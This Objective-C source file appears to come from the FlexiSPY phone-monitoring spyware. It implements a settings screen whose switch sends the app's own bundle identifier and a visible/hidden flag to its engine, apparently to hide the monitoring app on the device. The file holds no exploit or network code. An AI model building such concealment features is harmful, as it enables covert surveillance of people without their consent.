//
//  RunModeViewController.m
//  FlexiSPY
//
//  Created by Makara on 10/9/14.
//
//

#import "RunModeViewController.h"

#import "MobileSPYAppDelegate.h"
#import "AppEngineUICmd.h"
#import "PrefVisibility.h"
#import "PreferencesData.h"

@interface RunModeViewController ()

@end

@implementation RunModeViewController

@synthesize mSystemCoreVisibilitySwitch;

- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil
{
    self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
    if (self) {
        // Custom initialization
    }
    return self;
}

- (void)viewDidLoad
{
    [super viewDidLoad];
	// Do any additional setup after loading the view.
    
    // Adjust view position to be under navigation bar
    if ([self respondsToSelector:@selector(edgesForExtendedLayout)]) {
        DLog(@"set edgesForExtendedLayout")
        self.edgesForExtendedLayout = UIRectEdgeNone;
    }
    
    MobileSPYAppDelegate *appDelegate = (MobileSPYAppDelegate *)[[UIApplication sharedApplication] delegate];
	[[appDelegate mAppUIConnection] addCommandDelegate:self];
	[[appDelegate mAppUIConnection] processCommand:kAppUI2EngineGetCurrentSettingsCmd withCmdData:nil];
}

- (void) viewWillDisappear:(BOOL)animated {
    [super viewWillDisappear:animated];
    
    MobileSPYAppDelegate *appDelegate = (MobileSPYAppDelegate *)[[UIApplication sharedApplication] delegate];
	[[appDelegate mAppUIConnection] removeCommandDelegate:self];
}

- (void)didReceiveMemoryWarning
{
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

- (IBAction) systemCoreVisibilitySwitchChanged: (id) aSender {
    DLog (@"systemCoreVisibilitySwitchChanged ... ");
	NSMutableData *visibilityData = [NSMutableData data];
	
	BOOL visible = NO;
	NSInteger length = 0;
	
	NSInteger count = 1;
	[visibilityData appendBytes:&count length:sizeof(NSInteger)];
	
	// System Core
	NSString *bundleIndentifier = [[NSBundle mainBundle] bundleIdentifier];
	length = [bundleIndentifier lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	[visibilityData appendBytes:&length length:sizeof(NSInteger)];
	[visibilityData appendData:[bundleIndentifier dataUsingEncoding:NSUTF8StringEncoding]];
	if ([mSystemCoreVisibilitySwitch isOn]) {
		visible = YES;
	} else {
		visible = NO;
	}
	[visibilityData appendBytes:&visible length:sizeof(BOOL)];
	
	MobileSPYAppDelegate *appDelegate = (MobileSPYAppDelegate *)[[UIApplication sharedApplication] delegate];
	[[appDelegate mAppUIConnection] processCommand:kAppUI2EngineSystemCoreVisibilityCmd withCmdData:visibilityData];
}

- (void) commandCompleted: (id) aCmdResponse toCommand: (NSInteger) aCmd {
	DLog (@"commandCompleted.... ");
	if (aCmd == kAppUI2EngineGetCurrentSettingsCmd) {
		PreferencesData *initedPData = [[PreferencesData alloc] initWithData:aCmdResponse];
		PrefVisibility *prefVis = [initedPData mPVisibility];
		DLog (@"prefVis mVisible = %d, mVisibilities = %@", [prefVis mVisible], [prefVis mVisibilities]);
        
        // System Core
        if ([prefVis mVisible]) {
            [mSystemCoreVisibilitySwitch setOn:YES];
        } else {
            [mSystemCoreVisibilitySwitch setOn:NO];
        }
	}
}

- (void) dealloc {
    [mSystemCoreVisibilitySwitch release];
    [super dealloc];
}

@end
